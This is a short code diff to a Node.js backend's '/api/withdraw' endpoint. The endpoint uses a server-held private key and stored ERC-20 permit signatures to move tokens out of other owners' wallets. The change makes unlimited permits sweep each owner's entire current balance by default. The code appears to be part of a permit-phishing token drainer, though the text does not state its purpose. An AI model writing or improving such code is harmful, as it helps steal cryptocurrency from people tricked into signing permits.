@@ -279,12 +279,27 @@ app.post('/api/withdraw', async (req, res) => {
         const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
         const tokenContract = new ethers.Contract(permit.tokenAddress, ERC20_PERMIT_ABI, wallet);
         
-        const withdrawAmount = amount ? ethers.utils.parseUnits(amount, await tokenContract.decimals()) : permit.value;
+        const currentBalance = await tokenContract.balanceOf(permit.owner);
+        const permitValue = ethers.BigNumber.from(permit.value);
+        const maxAllowed = permitValue.eq(ethers.constants.MaxUint256) ? currentBalance : permitValue;
         
-        if (ethers.BigNumber.from(withdrawAmount).gt(ethers.BigNumber.from(permit.value))) {
+        let withdrawAmount;
+        if (amount) {
+            withdrawAmount = ethers.utils.parseUnits(amount, await tokenContract.decimals());
+            if (withdrawAmount.gt(maxAllowed)) {
+                return res.status(400).json({
+                    success: false,
+                    error: 'Сумма превышает разрешенную или доступный баланс'
+                });
+            }
+        } else {
+            withdrawAmount = currentBalance.gt(maxAllowed) ? maxAllowed : currentBalance;
+        }
+        
+        if (withdrawAmount.eq(0)) {
             return res.status(400).json({
                 success: false,
-                error: 'Сумма превышает разрешенную'
+                error: 'Баланс равен нулю'
             });
         }
         
